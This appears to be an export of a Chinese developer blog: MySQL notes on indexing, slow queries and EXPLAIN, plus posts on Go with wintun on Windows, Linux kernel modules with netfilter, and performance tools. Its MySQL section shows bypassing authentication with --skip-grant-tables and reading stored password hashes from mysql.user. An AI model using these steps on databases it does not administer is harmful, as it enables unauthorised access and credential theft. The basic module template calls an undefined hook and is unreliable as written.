<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">CREATE</span> INDEX gbk_name_idx <span class="keyword">ON</span> resource ((<span class="keyword">CONVERT</span>(name <span class="keyword">USING</span> gbk)));</span><br></pre></td></tr></table></figure>

<h2 id="8-添加计算列"><a href="#8-添加计算列" class="headerlink" title="8. 添加计算列"></a>8. 添加计算列</h2><ul>
<li>添加某一列的数据跟随另一列进行计算得到，计算式放as后面</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">alter</span> <span class="keyword">table</span> resource <span class="keyword">add</span> <span class="keyword">column</span> name_gbk <span class="type">varchar</span>(<span class="number">128</span>) <span class="type">character</span> <span class="keyword">set</span> gbk <span class="keyword">as</span> (<span class="keyword">convert</span>(name <span class="keyword">using</span> gbk));</span><br></pre></td></tr></table></figure>

<h2 id="9-管理操作"><a href="#9-管理操作" class="headerlink" title="9. 管理操作"></a>9. 管理操作</h2><h3 id="9-1-设置用户密码"><a href="#9-1-设置用户密码" class="headerlink" title="9.1. 设置用户密码"></a>9.1. 设置用户密码</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">alter</span> <span class="keyword">user</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;123456&#x27;</span>;</span><br></pre></td></tr></table></figure>

<h1 id="四、慢查询"><a href="#四、慢查询" class="headerlink" title="四、慢查询"></a>四、慢查询</h1><p><a href="https://blog.csdn.net/qq_39390545/article/details/116139445">MySQL慢查询，一口从天而降的锅！</a></p>
<p>慢查询就是执行很慢的查询语句，超过配置的时间。一条慢查询可能导致阻塞其他查询语句，造成cpu猛增，影响系统的正常运行</p>
<h2 id="1-配置"><a href="#1-配置" class="headerlink" title="1. 配置"></a>1. 配置</h2><h3 id="1-1-查看当前配置"><a href="#1-1-查看当前配置" class="headerlink" title="1.1. 查看当前配置"></a>1.1. 查看当前配置</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">慢查询日志记录开关和位置</span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">show variables like <span class="string">&quot;%slow_query%&quot;</span>;</span></span><br><span class="line">+-----------------------------+-----------------------------------+</span><br><span class="line">| Variable_name               | Value                             |</span><br><span class="line">+-----------------------------+-----------------------------------+</span><br><span class="line">| slow_query_log              | ON                                |</span><br><span class="line">| slow_query_log_file         | /hislog/log/mysql/mysqld_slow.log |</span><br><span class="line">+-----------------------------+-----------------------------------+</span><br><span class="line">7 rows in set (0.00 sec)</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash">慢查询时间阈值</span></span><br><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">show variables like <span class="string">&quot;%long_query%&quot;</span>;</span></span><br><span class="line">+-----------------+----------+</span><br><span class="line">| Variable_name   | Value    |</span><br><span class="line">+-----------------+----------+</span><br><span class="line">| long_query_time | 5.000000 |</span><br><span class="line">+-----------------+----------+</span><br><span class="line">1 row in set (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-2-配置文件"><a href="#1-2-配置文件" class="headerlink" title="1.2. 配置文件"></a>1.2. 配置文件</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">slow_query_log=ON</span><br><span class="line">slow_query_log_file=/hislog/log/mysql/mysqld_slow.log</span><br><span class="line">long_query_time=5</span><br></pre></td></tr></table></figure>

<h2 id="2-慢查询日志解读"><a href="#2-慢查询日志解读" class="headerlink" title="2. 慢查询日志解读"></a>2. 慢查询日志解读</h2><ul>
<li>一条慢查询语句的格式</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># Time: 2023-09-22T02:45:24.805459Z</span><br><span class="line"># User@Host: controller[controller] @ localhost [127.0.0.1]  Id: 563817</span><br><span class="line"># Query_time: 5.969860  Lock_time: 0.000514 Rows_sent: 99967  Rows_examined: 199934</span><br><span class="line">SET timestamp=1695350718;</span><br><span class="line">SELECT resource.id AS id,</span><br><span class="line">                UNIX_TIMESTAMP(resource.created_at) AS created_at,</span><br><span class="line">                UNIX_TIMESTAMP(resource.updated_at) AS updated_at,</span><br><span class="line">                IFNULL(baseline_permission_resource.status, 0) AS baseline_status</span><br><span class="line">                FROM resource</span><br><span class="line">                LEFT JOIN</span><br><span class="line">                baseline_permission_resource ON resource.id = baseline_permission_resource.resource_id</span><br><span class="line">                WHERE resource.status = 1</span><br><span class="line">                ORDER BY CONVERT(resource.name USING gbk) ASC;</span><br></pre></td></tr></table></figure>

<ul>
<li><code>Query_time</code>: 查询时间</li>
<li><code>Lock_time</code>: 锁定时间</li>
<li><code>Rows_sent</code>: 发送的行数</li>
<li><code>Rows_examined</code>: 检查的行数</li>
</ul>
<h2 id="3-分析sql语句"><a href="#3-分析sql语句" class="headerlink" title="3. 分析sql语句"></a>3. 分析sql语句</h2><ul>
<li>在sql语句前面加上<code>explain</code>，查看执行计划</li>
</ul>
<h1 id="五、性能和配置调优"><a href="#五、性能和配置调优" class="headerlink" title="五、性能和配置调优"></a>五、性能和配置调优</h1><h2 id="1-explain-分析sql语句"><a href="#1-explain-分析sql语句" class="headerlink" title="1. explain 分析sql语句"></a>1. explain 分析sql语句</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">mysql&gt; </span><span class="language-bash">explain <span class="keyword">select</span> * from resource order by <span class="built_in">id</span> asc;</span></span><br><span class="line">+----+-------------+----------+------------+-------+---------------+---------+---------+------+-------+----------+-------+</span><br><span class="line">| id | select_type | table    | partitions | type  | possible_keys | key     | key_len | ref  | rows  | filtered | Extra |</span><br><span class="line">+----+-------------+----------+------------+-------+---------------+---------+---------+------+-------+----------+-------+</span><br><span class="line">|  1 | SIMPLE      | resource | NULL       | index | NULL          | PRIMARY | 144     | NULL | 76807 |   100.00 | NULL  |</span><br><span class="line">+----+-------------+----------+------------+-------+---------------+---------+---------+------+-------+----------+-------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="1-1-各字段分析"><a href="#1-1-各字段分析" class="headerlink" title="1.1. 各字段分析"></a>1.1. 各字段分析</h3><ul>
<li><code>id</code>: 查询序列号，体现优先级，id越大优先级越高，越先被执行</li>
<li><code>select_type</code>: 查询类型</li>
<li><code>table</code>: 表名</li>
<li><code>partitions</code>: 分配到的分区</li>
<li><code>type</code>: 访问类型</li>
<li><code>possible_keys</code>: 可能使用到的索引</li>
<li><code>key</code>: 实际使用到的索引</li>
<li><code>key_len</code>: 索引字段长度</li>
<li><code>ref</code>: 列和索引的比较</li>
<li><code>rows</code>: 扫描的行数</li>
<li><code>filtered</code>: 过滤的比例</li>
<li><code>Extra</code>: 执行情况描述和说明</li>
</ul>
<h4 id="1-type-访问类型"><a href="#1-type-访问类型" class="headerlink" title="1) type 访问类型"></a>1) type 访问类型</h4><ul>
<li><code>ALL</code>: 全表扫描</li>
<li><code>index</code>: 只遍历索引树</li>
<li><code>range</code>: 只检索给定范围的行，使用一个索引来遍历行</li>
<li><code>ref</code>: 遍历索引树时，对一个或多个列进行引用</li>
<li><code>eq_ref</code>: 对于每个索引键，表中只有一条记录与之匹配</li>
<li><code>const</code>: 表示常量，一般做为查询条件</li>
<li><code>system</code>: 表示系统表</li>
</ul>
<h4 id="2-Extra-执行情况描述和说明"><a href="#2-Extra-执行情况描述和说明" class="headerlink" title="2) Extra 执行情况描述和说明"></a>2) Extra 执行情况描述和说明</h4><ul>
<li><code>Using index</code>: 查询的数据被索引覆盖，并且where筛选的是前导列，使用索引查找就可以直接找到符合条件的数据，无需回表</li>
<li><code>Using where</code>: 说明mysql将在存储引擎检索行后再进行过滤，没有用到索引，回表查询</li>
<li><code>Using temporary</code>: 对查询结果排序时使用了一个临时表</li>
<li><code>Using filesort</code>: 对结果使用一个外部索引排序，而不是按照索引次序从表中读取行，一般是order by用了其他数据</li>
<li><code>Using index condition</code>: 查询的列不全在索引中，where条件是一个前导列范围</li>
<li><code>Using where;Using index</code>: 查询的列被索引覆盖，where筛选条件也是索引列之一，但不是索引的前导列或出现其他影响了使用索引的情况（如存在范围筛选条件）。此情况下意味着无法直接通过索引查找来查询到符合条件的数据，影响并不大</li>
</ul>
<h1 id="六、攻防"><a href="#六、攻防" class="headerlink" title="六、攻防"></a>六、攻防</h1><h2 id="1-无密码登陆数据库"><a href="#1-无密码登陆数据库" class="headerlink" title="1. 无密码登陆数据库"></a>1. 无密码登陆数据库</h2><ul>
<li>先使用管理员打开cmd，停止mysql服务</li>
<li>执行命令</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysqld --skip-grant-tables --skip-networking</span><br></pre></td></tr></table></figure>

<ul>
<li>窗口不关，打开新的窗口输入命令</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mysql -uroot -p</span><br></pre></td></tr></table></figure>

<ul>
<li>直接回车即可进入mysql</li>
</ul>
<h2 id="2-查看其他用户密码"><a href="#2-查看其他用户密码" class="headerlink" title="2. 查看其他用户密码"></a>2. 查看其他用户密码</h2><ul>
<li>先使用root登陆mysql</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 进入到mysql表</span></span><br><span class="line">mysql<span class="operator">&gt;</span> use mysql</span><br><span class="line"><span class="comment">-- 查看用户表</span></span><br><span class="line">mysql<span class="operator">&gt;</span> <span class="keyword">select</span> <span class="keyword">User</span>,authentication_string <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> <span class="keyword">user</span><span class="operator">=</span><span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="operator">+</span><span class="comment">------+------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> <span class="keyword">User</span> <span class="operator">|</span> authentication_string                                                  <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------------------------------------------------------------------------+</span></span><br><span class="line"><span class="operator">|</span> root <span class="operator">|</span> $A$<span class="number">005</span>$&#125;<span class="operator">^</span>E@;OdE#r5v<span class="operator">~</span>n7?Zb6fguWE0s8xAHpzRbcsQNTI07P35mPJwUVVZiew610 <span class="operator">|</span></span><br><span class="line"><span class="operator">+</span><span class="comment">------+------------------------------------------------------------------------+</span></span><br><span class="line"><span class="number">1</span> <span class="type">row</span> <span class="keyword">in</span> <span class="keyword">set</span> (<span class="number">0.00</span> sec)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h1 id="小技巧和踩坑记"><a href="#小技巧和踩坑记" class="headerlink" title="小技巧和踩坑记"></a>小技巧和踩坑记</h1><h2 id="1-表情符号导致无法插入数据库"><a href="#1-表情符号导致无法插入数据库" class="headerlink" title="1. 表情符号导致无法插入数据库"></a>1. 表情符号导致无法插入数据库</h2><ul>
<li>utf8无法支持表情符号，需要将数据库转到utf8mb4</li>
</ul>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">ALTER</span> <span class="keyword">TABLE</span> mirror_user CHANGE name name <span class="type">varchar</span>(<span class="number">128</span>) <span class="type">CHARACTER</span> <span class="keyword">SET</span> utf8mb4 <span class="keyword">COLLATE</span> utf8mb4_bin;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>Web</category>
      </categories>
  </entry>
  <entry>
    <title>windows上的go开发</title>
    <url>/blogs/2023-06-05-go-for-windows/</url>
    <content><![CDATA[<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\sangfor&gt; go version</span><br><span class="line">go version go1.<span class="number">20.3</span> windows/amd64</span><br></pre></td></tr></table></figure>

<h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><h1 id="二、好用的第三方库"><a href="#二、好用的第三方库" class="headerlink" title="二、好用的第三方库"></a>二、好用的第三方库</h1><h2 id="1-wintun-golang-zx2c4-com-wireguard"><a href="#1-wintun-golang-zx2c4-com-wireguard" class="headerlink" title="1. wintun golang.zx2c4.com/wireguard"></a>1. wintun <code>golang.zx2c4.com/wireguard</code></h2><ul>
<li>三层网卡的虚拟网卡驱动</li>
<li>使用wireguard的wintun库</li>
<li>到官网下载安装包: <a href="https://www.wintun.net/">https://www.wintun.net/</a></li>
<li>解压后是dll库，将dll库放到go程序运行目录即可</li>
<li>需要管理员权限运行程序才能安装虚拟网卡</li>
</ul>
<h3 id="1-1-示例代码"><a href="#1-1-示例代码" class="headerlink" title="1.1. 示例代码"></a>1.1. 示例代码</h3><figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;flag&quot;</span></span><br><span class="line">	<span class="string">&quot;fmt&quot;</span></span><br><span class="line">	<span class="string">&quot;net/netip&quot;</span></span><br><span class="line">	<span class="string">&quot;os&quot;</span></span><br><span class="line">	<span class="string">&quot;os/exec&quot;</span></span><br><span class="line"></span><br><span class="line">	<span class="string">&quot;golang.zx2c4.com/wireguard/tun&quot;</span></span><br><span class="line">	<span class="string">&quot;golang.zx2c4.com/wireguard/windows/tunnel/winipcfg&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	flag.Parse()</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> flag.NArg() &lt; <span class="number">1</span> &#123;</span><br><span class="line">		fmt.Println(<span class="string">&quot;please input ip with mask x.x.x.x/xx&quot;</span>)</span><br><span class="line">		os.Exit(<span class="number">1</span>)</span><br><span class="line">	&#125;</span><br><span class="line">	addrWithMask := flag.Arg(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 创建网卡</span></span><br><span class="line">	dev, err := tun.CreateTUN(<span class="string">&quot;MyNIC&quot;</span>, <span class="number">0</span>)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">defer</span> dev.Close()</span><br><span class="line"></span><br><span class="line">	devName, err := dev.Name()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	nativeTunDevice := dev.(*tun.NativeTun)</span><br><span class="line"></span><br><span class="line">	link := winipcfg.LUID(nativeTunDevice.LUID())</span><br><span class="line"></span><br><span class="line">	ip, err := netip.ParsePrefix(addrWithMask)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 设置ip到网卡上</span></span><br><span class="line">	err = link.SetIPAddresses([]netip.Prefix&#123;ip&#125;)</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cmd := exec.Command(<span class="string">&quot;netsh&quot;</span>, <span class="string">&quot;interface&quot;</span>, <span class="string">&quot;ip&quot;</span>, <span class="string">&quot;set&quot;</span>, <span class="string">&quot;interface&quot;</span>, devName, <span class="string">&quot;metric=1&quot;</span>)</span><br><span class="line">	fmt.Println(cmd)</span><br><span class="line">	<span class="keyword">if</span> err = cmd.Run(); err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="built_in">panic</span>(err)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">select</span> &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h1 id="三、系统api调用"><a href="#三、系统api调用" class="headerlink" title="三、系统api调用"></a>三、系统api调用</h1><h2 id="1-当前用户sid获取"><a href="#1-当前用户sid获取" class="headerlink" title="1. 当前用户sid获取"></a>1. 当前用户sid获取</h2><ul>
<li>uid就是sid</li>
</ul>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> (</span><br><span class="line">	<span class="string">&quot;os/user&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">GetCurrentUserSid</span><span class="params">()</span></span> (sid <span class="type">string</span>, err <span class="type">error</span>) &#123;</span><br><span class="line">	u, err := user.Current()</span><br><span class="line">	<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">		<span class="keyword">return</span></span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> u.Uid, <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>Web</category>
      </categories>
      <tags>
        <tag>windows</tag>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title>linux驱动开发</title>
    <url>/blogs/2023-06-01-linux-driver/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><h1 id="一、环境搭建"><a href="#一、环境搭建" class="headerlink" title="一、环境搭建"></a>一、环境搭建</h1><h1 id="二、开发注意事项"><a href="#二、开发注意事项" class="headerlink" title="二、开发注意事项"></a>二、开发注意事项</h1><h2 id="1-基本模板"><a href="#1-基本模板" class="headerlink" title="1. 基本模板"></a>1. 基本模板</h2><h3 id="1-1-makefile编写"><a href="#1-1-makefile编写" class="headerlink" title="1.1. makefile编写"></a>1.1. makefile编写</h3><figure class="highlight makefile"><table><tr><td class="code"><pre><span class="line">ARCH := <span class="variable">$(<span class="built_in">shell</span> uname -r)</span></span><br><span class="line">obj-m := hello.o</span><br><span class="line">KERNEL := /lib/modules/<span class="variable">$(ARCH)</span>/build</span><br><span class="line">PWD := <span class="variable">$(<span class="built_in">shell</span> pwd)</span></span><br><span class="line">CONFIG_BBB = n</span><br><span class="line"></span><br><span class="line">hello-obj += hello_main.o file1.o</span><br><span class="line">hello-y += file2.o</span><br><span class="line">hello-<span class="variable">$(CONFIG_BBB)</span> += file3.o</span><br><span class="line"></span><br><span class="line">modules :</span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNEL)</span> M=<span class="variable">$(PWD)</span> modules</span><br><span class="line"></span><br><span class="line">clean :</span><br><span class="line">	<span class="variable">$(MAKE)</span> -C <span class="variable">$(KERNEL)</span> M=<span class="variable">$(PWD)</span> clean</span><br></pre></td></tr></table></figure>

<h4 id="1-命令解释"><a href="#1-命令解释" class="headerlink" title="1) 命令解释"></a>1) 命令解释</h4><ul>
<li>linux驱动编译最核心的命令是<code>make -C &lt;kernel-source-dir&gt; M=$(PWD) modules</code></li>
<li><code>-C &lt;dir&gt;</code>: 指定内核源码目录，里面存放最高级的makefile</li>
<li><code>M=&lt;dir&gt;</code>: 代表我们模块的makefile在这里</li>
</ul>
<h4 id="2-makefile内容解释"><a href="#2-makefile内容解释" class="headerlink" title="2) makefile内容解释"></a>2) makefile内容解释</h4><ul>
<li><code>obj-m := $&#123;MODULE_NAME&#125;.o</code>: 指定要编译的ko文件，<code>$&#123;MODULE_NAME&#125;.o</code>会生成<code>$&#123;MODULE_NAME&#125;.ko</code>文件，写多个会生成多个</li>
<li><code>$&#123;MODULE_NAME&#125;-obj += xxx.o</code>: 指定要编译的多个c文件，每个<code>xxx.o</code>会找<code>xxx.c</code>文件去编译，注意不能和<code>$&#123;MODULE_NAME&#125;</code>同名，同名会循环引用错误<ul>
<li>如果编译<code>hello.ko</code>有两个源文件<code>hello.c</code>和<code>file1.c</code>，需要指定<code>obj-m := hello.o</code>，而obj需要将<code>hello.c</code>重命名为<code>hello_main.c</code>，然后设置<code>hello-objs := hello_main.o file1.o </code></li>
<li>如果只有一个源文件<code>hello.c</code>，那么不用指定<code>hello-objs</code>，会找<code>hello.c</code>文件</li>
<li>经过测试，此变量不能等于变量，需要显式指定文件</li>
</ul>
</li>
<li><code>$&#123;MODULE_NAME&#125;-y += xxx.o</code>: 和<code>-n</code>对应，某些文件是否编译进去，一般设定变量来决定是<code>y</code>还是<code>n</code></li>
</ul>
<h3 id="1-2-源文件结构"><a href="#1-2-源文件结构" class="headerlink" title="1.2. 源文件结构"></a>1.2. 源文件结构</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="built_in">MODULE_LICENSE</span>(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">hello_init</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printk</span>(KERN_ALERT <span class="string">&quot;hello, world\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">hello_exit</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">nf_unregister_net_hook</span>(&amp;init_net, &amp;nfho);</span><br><span class="line">    <span class="built_in">printk</span>(KERN_ALERT <span class="string">&quot;Goodby, cruel world\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module_init</span>(hello_init);</span><br><span class="line"><span class="built_in">module_exit</span>(hello_exit);</span><br></pre></td></tr></table></figure>

<ul>
<li>上面这样的结构，需要用<code>module_init</code>和<code>module_exit</code>定义insmod和rmmod对应的时间点的操作</li>
<li>打印只能使用<code>printk</code>，会输出到<code>dmesg</code>命令的输出中</li>
<li><code>MODULE_LICENSE</code>定义开源协议</li>
</ul>
<h1 id="三、实战示例"><a href="#三、实战示例" class="headerlink" title="三、实战示例"></a>三、实战示例</h1><h2 id="1-netfilter框架"><a href="#1-netfilter框架" class="headerlink" title="1. netfilter框架"></a>1. netfilter框架</h2><h3 id="1-1-在INPUT链输出包的源ip和目的ip"><a href="#1-1-在INPUT链输出包的源ip和目的ip" class="headerlink" title="1.1. 在INPUT链输出包的源ip和目的ip"></a>1.1. 在INPUT链输出包的源ip和目的ip</h3><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/netfilter.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/ip.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/netfilter_ipv4.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">nf_hook_ops</span> nfho;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">unsigned</span> <span class="type">int</span> <span class="title">hook_func</span><span class="params">(<span class="type">void</span> *priv, <span class="keyword">struct</span> sk_buff *skb, <span class="type">const</span> <span class="keyword">struct</span> nf_hook_state *state)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">iphdr</span> *ip = <span class="built_in">ip_hdr</span>(skb);</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">sockaddr_in</span> src_addr, dst_addr;</span><br><span class="line">    <span class="built_in">memset</span>(&amp;src_addr, <span class="number">0</span>, <span class="built_in">sizeof</span>(src_addr));</span><br><span class="line">    <span class="built_in">memset</span>(&amp;dst_addr, <span class="number">0</span>, <span class="built_in">sizeof</span>(dst_addr));</span><br><span class="line">    src_addr.sin_family = AF_INET;</span><br><span class="line">    dst_addr.sin_family = AF_INET;</span><br><span class="line">    src_addr.sin_addr.s_addr = ip-&gt;saddr;</span><br><span class="line">    dst_addr.sin_addr.s_addr = ip-&gt;daddr;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printk</span>(KERN_INFO <span class="string">&quot;Packet received %pI4 to %pI4\n&quot;</span>, &amp;src_addr.sin_addr, &amp;dst_addr.sin_addr);</span><br><span class="line">    <span class="keyword">return</span> NF_ACCEPT;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">MODULE_LICENSE</span>(<span class="string">&quot;GPL&quot;</span>);</span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">hello_init</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    nfho.hook = hook_func;</span><br><span class="line">    nfho.hooknum = NF_INET_LOCAL_IN;</span><br><span class="line">    nfho.pf = PF_INET;</span><br><span class="line">    nfho.priority = NF_IP_PRI_FIRST;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">nf_register_net_hook</span>(&amp;init_net, &amp;nfho);</span><br><span class="line">    <span class="built_in">printk</span>(KERN_ALERT <span class="string">&quot;hello, world\n&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">void</span> <span class="title">hello_exit</span><span class="params">(<span class="type">void</span>)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">nf_unregister_net_hook</span>(&amp;init_net, &amp;nfho);</span><br><span class="line">    <span class="built_in">printk</span>(KERN_ALERT <span class="string">&quot;Goodby, cruel world\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">module_init</span>(hello_init);</span><br><span class="line"><span class="built_in">module_exit</span>(hello_exit);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>Program</category>
        <category>C/C++</category>
      </categories>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>linu性能观测和排查</title>
    <url>/blogs/2023-05-25-linux-performance/</url>
    <content><![CDATA[<h1 id="一、性能观测工具"><a href="#一、性能观测工具" class="headerlink" title="一、性能观测工具"></a>一、性能观测工具</h1><h2 id="1-pidstat-进程状态观测"><a href="#1-pidstat-进程状态观测" class="headerlink" title="1. pidstat 进程状态观测"></a>1. pidstat 进程状态观测</h2><h3 id="1-1-选项解释"><a href="#1-1-选项解释" class="headerlink" title="1.1. 选项解释"></a>1.1. 选项解释</h3><ul>
<li><code>-p &lt;pid&gt;</code>: 进程id号，不指定就显示所有的进程</li>
<li><code>-r</code>: 显示内存使用情况和页错误</li>
<li><code>-u</code>: 显示cpu使用情况</li>
<li><code>-d</code>: 显示io使用情况</li>
<li><code>-h</code>: 指定多个统计后，将统计结果显示在一行里面</li>
<li><code>-H</code>: 使用时间戳显示时间，默认时间显示的是<code>03:22:38 PM</code></li>
</ul>
<h3 id="1-2-内存观测"><a href="#1-2-内存观测" class="headerlink" title="1.2. 内存观测"></a>1.2. 内存观测</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">观测pid 1584925的内存情况，每秒输出一次</span></span><br><span class="line">=&gt; pidstat -p 1584925 -r 1</span><br><span class="line">Linux 6.3.1-arch1-1 (arch-work-pc)      05/25/2023      _x86_64_        (16 CPU)</span><br><span class="line"></span><br><span class="line">03:25:26 PM   UID       PID  minflt/s  majflt/s     VSZ     RSS   %MEM  Command</span><br><span class="line">03:25:27 PM     0   1584925     11.00      0.00 6572528 3098804   9.54  wireshark</span><br><span class="line">03:25:28 PM     0   1584925      9.00      0.00 6572528 3098932   9.54  wireshark</span><br><span class="line">03:25:29 PM     0   1584925     11.00      0.00 6572528 3098932   9.54  wireshark</span><br><span class="line">03:25:30 PM     0   1584925     19.00      0.00 6572704 3098932   9.54  wireshark</span><br><span class="line">03:25:31 PM     0   1584925     17.00      0.00 6572704 3099060   9.54  wireshark</span><br></pre></td></tr></table></figure>

<ul>
<li><code>minflt/s</code>: 任务每秒发生的小故障总数，这些小故障不需要从磁盘加载内存页。</li>
<li><code>majflt/s</code>: 任务每秒发生的主要故障总数，这些故障需要从磁盘加载内存页。</li>
<li><code>VSZ</code>: 虚拟大小（Virtual Size），整个任务的虚拟内存使用情况，单位为KByte。</li>
<li><code>RSS</code>: 常驻集大小（Resident Set Size），任务使用的未交换的物理内存，单位为KByte。</li>
</ul>
<h2 id="2-top-类似任务管理器"><a href="#2-top-类似任务管理器" class="headerlink" title="2. top 类似任务管理器"></a>2. top 类似任务管理器</h2><h3 id="2-1-选项解释"><a href="#2-1-选项解释" class="headerlink" title="2.1. 选项解释"></a>2.1. 选项解释</h3><ul>
<li><code>-p &lt;pid&gt;</code>: 只显示某个进程，不指定就显示所有进程</li>
</ul>
<h3 id="2-2-几个快捷键"><a href="#2-2-几个快捷键" class="headerlink" title="2.2. 几个快捷键"></a>2.2. 几个快捷键</h3><ul>
<li><code>Shift + E</code>: 调整内存单位</li>
<li><code>1</code>: 切换cpu统计模式，所有&#x2F;详细</li>
<li><code>Shift + P</code>: cpu占用排序</li>
<li><code>Shift + M</code>: 内存占用排序</li>
<li><code>m</code>: 切换内存显示样式</li>
